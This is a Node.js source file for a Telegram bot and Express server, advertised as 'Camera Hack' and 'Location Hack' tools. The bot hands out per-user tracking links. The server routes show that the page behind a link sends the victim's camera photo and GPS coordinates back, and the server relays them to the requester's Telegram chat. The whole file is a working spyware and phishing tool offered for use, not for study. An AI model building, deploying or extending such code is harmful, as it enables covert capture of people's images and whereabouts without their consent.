const TelegramBot = require("node-telegram-bot-api");
const express = require("express");
const crypto = require("crypto");
const { BOT_TOKEN, SERVER_URL, CHANNELS } = require("./data");

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();
app.use(express.json());
app.use(express.static("public")); // Serve static files from the public folder

// Welcome Message
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const name = msg.chat.first_name || "User";

  const options = {
    reply_markup: {
      inline_keyboard: CHANNELS.map((channel) => [
        { text: `Join ${channel.name}`, url: channel.link },
      ]),
    },
  };

  bot.sendMessage(
    chatId,
    `Hello ${name}! How are you? Let's have fun with Friends 🧡.\nJoin the channels below to use me 😊.\n\nDeveloper team: @thoxer_hack`,
    options
  );

  setTimeout(() => {
    bot.sendMessage(
      chatId,
      `After joining both channels, click the button below to continue.`,
      {
        reply_markup: {
          inline_keyboard: [[{ text: "Continue", callback_data: "continue" }]],
        },
      }
    );
  }, 2000);
});

// Command options after joining channels
bot.on("callback_query", (query) => {
  const chatId = query.message.chat.id;

  if (query.data === "continue") {
    const options = {
      reply_markup: {
        inline_keyboard: [
          [{ text: "📷 Camera Hack", callback_data: "camera" }],
          [{ text: "📍 Location Hack", callback_data: "location" }],
          [{ text: "🛠️ All Tools", callback_data: "all_tools" }],
        ],
      },
    };
    bot.sendMessage(chatId, "Choose a tool below:", options);
  }

  if (["camera", "location", "all_tools"].includes(query.data)) {
    const randomId = crypto.randomBytes(6).toString("hex");
    const generatedLink = `${SERVER_URL}/redirect/${randomId}?chatId=${chatId}&tool=${query.data}`;

    bot.sendMessage(
      chatId,
      `Here is your generated link for ${query.data}:\n[${generatedLink}](${generatedLink})`,
      { parse_mode: "Markdown" }
    );
  }
});

// Serve Camera.html page with query params
app.get("/redirect/:id", (req, res) => {
  const { id } = req.params;
  const { chatId, tool } = req.query;

  if (!id || !chatId || !tool) {
    return res.status(400).send("Invalid request. Missing parameters.");
  }

  res.sendFile(__dirname + "/public/camera.html", (err) => {
    if (err) {
      console.error("Error serving camera.html:", err.message);
      res.status(500).send("Server error. Unable to load the page.");
    }
  });
});

// Handle Camera data submission
app.post("/send-camera", (req, res) => {
  const { photo, chatId } = req.body;

  if (photo && chatId) {
    bot.sendPhoto(chatId, photo, {
      caption: "📸 Photo received.\n\nDeveloped by @hariomkunwar",
    });
    res.send("Photo sent to bot.");
  } else {
    res.status(400).send("Invalid data.");
  }
});

// Handle Location data submission
app.post("/send-location", (req, res) => {
  const { latitude, longitude, chatId } = req.body;

  if (latitude && longitude && chatId) {
    bot.sendMessage(
      chatId,
      `📍 Location received:\nLatitude: ${latitude}\nLongitude: ${longitude}\n\nDeveloped by @hariomkunwar`
    );
    res.send("Location sent to bot.");
  } else {
    res.status(400).send("Invalid data.");
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("Server is running...");
});